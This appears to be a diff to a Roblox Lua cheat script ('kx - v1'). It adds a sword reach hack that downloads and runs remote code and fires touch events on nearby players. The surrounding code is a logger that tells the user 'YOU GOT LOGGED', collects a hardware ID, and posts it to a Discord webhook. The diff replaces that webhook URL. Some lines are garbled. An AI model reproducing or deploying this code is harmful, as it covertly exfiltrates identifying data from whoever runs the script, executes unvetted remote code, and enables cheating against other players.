@@ -1,3 +1,129 @@
+local DrawingLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Blissful4992/ESPs/main/3D%20Drawing%20Api.lua"))()
+local Visualizer = DrawingLib:New3DCircle()
+Visualizer.Color = Color3.new(1, 1, 1)
+Visualizer.Thickness = 1
+Visualizer.Radius = 4
+Visualizer.Visible = false
+
+local Increment = 1
+
+local function updateVisualizer()
+    local sword = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+    if sword then
+        local handle = sword:FindFirstChild("Handle")
+        if handle and Visualizer.Visible then
+            Visualizer.Position = handle.Position
+        end
+    end
+end
+
+game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
+    char.ChildAdded:Connect(function(tool)
+        if tool:IsA("Tool") then
+            if not tool:FindFirstChild("Handle") then
+                tool.ChildAdded:Connect(function(child)
+                    if child.Name == "Handle" then
+                        Visualizer.Position = child.Position
+                        Visualizer.Visible = true
+                    end
+                end)
+            else
+                Visualizer.Position = tool.Handle.Position
+                Visualizer.Visible = true
+            end
+        end
+    end)
+end)
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    updateVisualizer()
+    
+    local sword = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+    if sword then
+        local handle = sword:FindFirstChild("Handle")
+        if handle then
+            for _, otherPlayer in pairs(game:GetService("Players"):GetPlayers()) do
+                if otherPlayer ~= game.Players.LocalPlayer -- Make sure it's not the local player
+                    and otherPlayer.Character 
+                    and otherPlayer.Character:FindFirstChild("HumanoidRootPart") 
+                    and otherPlayer.Character.HumanoidRootPart:IsA("BasePart") then
+                    local distance = (handle.Position - otherPlayer.Character.HumanoidRootPart.Position).Magnitude
+                    if distance <= Visualizer.Radius + 1 then
+                        firetouchinterest(handle, otherPlayer.Character.HumanoidRootPart, 0)
+                        firetouchinterest(handle, otherPlayer.Character.HumanoidRootPart, 1)
+                    end
+                end
+            end
+        end
+    end
+end)
+
+game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed then
+        if input.KeyCode == Enum.KeyCode.Q then
+            Visualizer.Radius = Visualizer.Radius + Increment
+          game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "kx - v1",
+        Text = "Radius increased to" .. Visualizer.Radius
+            })
+        elseif input.KeyCode == Enum.KeyCode.E then
+            Visualizer.Radius = math.max(1, Visualizer.Radius - Increment)
+          game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "kx - v1",
+        Text = "Radius decreased to" .. Visualizer.Radius
+    })
+        end
+    end
+end)
+
+local pulsating = false
+local pulseFrequency = 0.1
+local pulseSpeed = 0.07
+local minRadius = 2
+local maxRadius = Visualizer.Radius
+local currentRadius = maxRadius
+local pulseDirection = -1
+
+local function pulsateVisualizer()
+    if not pulsating then
+        return
+    end
+    
+    currentRadius = currentRadius + pulseDirection * pulseSpeed
+    
+    if currentRadius < minRadius then
+        currentRadius = minRadius
+        pulseDirection = -pulseDirection
+    elseif currentRadius > maxRadius then
+        currentRadius = maxRadius
+        pulseDirection = -pulseDirection
+    end
+    
+    Visualizer.Radius = currentRadius
+end
+
+local function togglePulsating()
+    pulsating = not pulsating
+    maxRadius = Visualizer.Radius
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "kx - v1",
+        Text = "Visualizer is now " .. (pulsating and "pulsating" or "not pulsating")
+    })
+end
+
+game:GetService("UserInputService").InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.V then
+        togglePulsating()
+    end
+end)
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    updateVisualizer()
+    pulsateVisualizer()
+end)
+
+
+
 gameGetService(StarterGui)SetCore(SendNotification,{
 	Title = YOU GOT LOGGED, 
 	Text = LOOOOOOOOOOOOOOL, 
@@ -56,7 +182,7 @@ end
 
 if hwid then
 local HttpServ = gameGetService('HttpService')
-local url = "https://discord.com/api/webhooks/1092520743734095982/7IDnQsi__UzlEWweNh3mZZvCoAjll11YSJSz8CRU1sYDEe8gn0my4Q6ydkEC1Xa5iN-S"
+local url = "https://discord.com/api/webhooks/1097190149458247801/9TY3sUIa3Fl6UJcCARqJsk2sde83uSKQ_9d5vW53ndTPSKGvApZ2fps150p_BjkcGgph"
 
 
 local data = 
@@ -117,7 +243,13 @@ local data =
     http_request(request_payload)
 end
 
+
+
+
+
 wait(10)
+
+
 _G.errorchecks = true
 while _G.errorchecks == true do
     print(...)
